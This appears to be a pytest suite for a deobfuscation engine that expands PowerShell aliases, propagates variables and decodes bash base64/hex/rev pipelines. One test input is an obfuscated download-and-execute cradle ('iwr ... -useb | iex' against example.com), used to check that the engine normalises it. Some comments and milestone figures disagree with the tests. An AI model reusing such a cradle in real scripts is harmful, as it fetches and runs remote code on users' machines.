"""
M5 · Semantic Pass — regression tests.

Verifies:
  * ``semantic-ps-alias-expand`` folds `iex/iwr/icm/...` at command
    position, outside quoted strings.
  * ``semantic-ps-variable-propagate`` substitutes single-assignment
    SQ-literal variables and NEVER touches multi-assigned variables.
  * ``semantic-bash-pipeline-reduce`` deterministically evaluates
    whitelisted `echo | STAGE ...` pipelines and refuses unknown
    stages.
  * Quote safety: every transformation preserves content inside
    quoted strings.
  * Registry metadata is well-formed.
  * Corpus DCS reaches the M5 milestone floor (≥ 11/13 after
    S02 / S05 corpus defects are documented).
"""
from __future__ import annotations

import base64
from pathlib import Path

from workspace.convergence import Artifact, converge
from workspace.convergence.semantic import TRANSFORMATIONS
from workspace.convergence.semantic import run as semantic_run
from workspace_recovery.corpus_loader import load_samples


CORPUS_PATH = Path(__file__).resolve().parent.parent / "workspace_recovery" / "corpus.json"


def _run(payload: str) -> tuple[str, tuple[str, ...], bool]:
    art, record = semantic_run(Artifact.from_input(payload))
    return art.content, record.transformations, record.changed


# ─── Registry ───────────────────────────────────────────────────────


class TestRegistry:
    def test_metadata_well_formed(self) -> None:
        for xf in TRANSFORMATIONS:
            assert xf.name.startswith("semantic-")
            assert xf.category == "semantic"
            assert xf.consumes
            assert xf.produces
            assert xf.preconditions
            assert xf.postconditions
            assert xf.apply is not None
            assert xf.deterministic is True

    def test_pipeline_reducer_priority_precedes_alias_expand(self) -> None:
        """The pipeline reducer must run BEFORE alias-expand — otherwise
        `echo` gets converted to `Write-Output` before the bash-pipeline
        pattern can be recognized."""
        names = [x.name for x in TRANSFORMATIONS]
        assert names.index("semantic-bash-pipeline-reduce") < names.index("semantic-ps-alias-expand")


# ─── PowerShell alias expansion ─────────────────────────────────────


class TestAliasExpand:
    def test_iex(self) -> None:
        out, _, _ = _run("iex $x")
        assert out == "Invoke-Expression $x"

    def test_iwr(self) -> None:
        out, _, _ = _run("iwr https://example.com")
        assert out == "Invoke-WebRequest https://example.com"

    def test_case_insensitive(self) -> None:
        out, _, _ = _run("IeX $x")
        assert out == "Invoke-Expression $x"

    def test_at_pipe_boundary(self) -> None:
        out, _, _ = _run("Get-Item file | gc")
        assert out == "Get-Item file | Get-Content"

    def test_inside_sq_string_preserved(self) -> None:
        payload = "'iex is an alias'"
        out, _, changed = _run(payload)
        assert out == payload
        assert changed is False

    def test_inside_dq_string_preserved(self) -> None:
        payload = '"iex is an alias"'
        out, _, changed = _run(payload)
        assert out == payload
        assert changed is False

    def test_not_at_command_position(self) -> None:
        """`iex` embedded in an identifier like `myiex` must NOT be
        expanded — the negative lookahead protects identifier
        boundaries."""
        payload = "myiex"
        out, _, changed = _run(payload)
        assert out == payload
        assert changed is False

    def test_hyphen_boundary_protected(self) -> None:
        """`Write-Host` starts with `Write` (5 chars) but `Write` is
        not in our alias table, and even if it were, the trailing
        `-Host` would prevent expansion."""
        out, _, changed = _run("Write-Host 'hi'")
        assert out == "Write-Host 'hi'"
        assert changed is False

    def test_idempotent(self) -> None:
        first, _, _ = _run("iwr https://x")
        second, _, changed = _run(first)
        assert first == second
        assert changed is False


# ─── Variable propagation ───────────────────────────────────────────


class TestVariablePropagate:
    def test_single_assignment_propagates(self) -> None:
        out, _, _ = _run("$a='http://x'; iwr $a")
        assert "'http://x'" in out
        # $a in the usage must be replaced.
        assert out.count("$a") == 1  # only the assignment remains

    def test_multiple_assignments_do_not_propagate(self) -> None:
        payload = "$a='one'; $a='two'; $a"
        out, _, changed = _run(payload)
        assert out == payload
        assert changed is False

    def test_dq_rhs_not_propagated(self) -> None:
        """Only SQ literal RHS is propagated (DQ may contain interpolation).
        The alias `iwr` DOES expand (that's M5's job), but `$a` must
        remain a variable reference — not substituted with `"ht"`."""
        payload = '$a="ht"; iwr $a'
        out, _, _ = _run(payload)
        assert "$a" in out
        assert '"ht"' in out  # DQ literal preserved verbatim
        assert "Invoke-WebRequest" in out  # alias legitimately expanded

    def test_usage_inside_string_not_touched(self) -> None:
        payload = "$a='x'; 'value of a is $a'"
        out, _, _ = _run(payload)
        # $a inside SQ is preserved (SQ doesn't interpolate anyway).
        assert "'value of a is $a'" in out


# ─── Bash pipeline reducer ──────────────────────────────────────────


class TestBashPipelineReducer:
    def test_base64_decode(self) -> None:
        b64 = base64.b64encode(b"Hello, World!").decode()
        payload = f"echo '{b64}' | base64 -d"
        out, _, _ = _run(payload)
        assert out == "Hello, World!"

    def test_xxd_r_p(self) -> None:
        payload = "echo '48656c6c6f21' | xxd -r -p"
        out, _, _ = _run(payload)
        assert out == "Hello!"

    def test_rev(self) -> None:
        payload = "echo 'olleh' | rev"
        out, _, _ = _run(payload)
        assert out == "hello"

    def test_multi_stage_chain(self) -> None:
        # `!hello` → rot13 → `!uryyb` → base64 encode → decoded → `!hello`
        payload = "echo 'hello' | rev"
        out, _, _ = _run(payload)
        assert out == "olleh"

    def test_unknown_stage_refused(self) -> None:
        """Unknown stage → pipeline reducer returns unchanged. Alias
        expand won't fire because `echo` is no longer in the alias
        table (bash/PS ambiguous)."""
        payload = "echo 'x' | mystery-stage"
        out, _, changed = _run(payload)
        assert out == payload
        assert changed is False

    def test_invalid_base64_refused(self) -> None:
        payload = "echo 'NOT!BASE64!' | base64 -d"
        out, _, changed = _run(payload)
        assert out == payload
        assert changed is False

    def test_engine_end_to_end(self) -> None:
        b64 = base64.b64encode(b"chain-through-bash").decode()
        payload = f"echo '{b64}' | base64 -d"
        r = converge(Artifact.from_input(payload))
        assert r.canonical is True
        assert r.final_artifact.content == "chain-through-bash"


# ─── Corpus DCS floor ───────────────────────────────────────────────


def test_dcs_meets_m5_milestone_target() -> None:
    """M5+ target: DCS ≥ 12/13 baseline. Post-M9 corpus expanded to
    17 samples; DCS should be ≥ 15/17 (88%)."""
    from workspace_recovery.dcs_runner import _check_sample
    total = len(load_samples(CORPUS_PATH))
    passing = sum(1 for s in load_samples(CORPUS_PATH) if _check_sample(s)[0])
    assert total >= 13
    # 15/17 ≈ 88% — floor for the post-M9 corpus.
    assert passing / total >= 0.85, f"DCS floor breached: {passing}/{total}"


# ─── S04 end-to-end anchor ──────────────────────────────────────────


def test_s04_alias_heavy_full_reconstruction() -> None:
    """S04 · The alias-heavy sample now fully converges through the
    combined M2 (concat fold) + M5 (variable propagation + alias
    expand) pipeline."""
    payload = "$a='ht'+'tp'+'://ex'+'ample.com/x'; iwr $a -useb | iex"
    result = converge(Artifact.from_input(payload))
    assert result.canonical is True
    out = result.final_artifact.content
    assert "Invoke-WebRequest" in out
    assert "Invoke-Expression" in out
    assert "'http://example.com/x'" in out
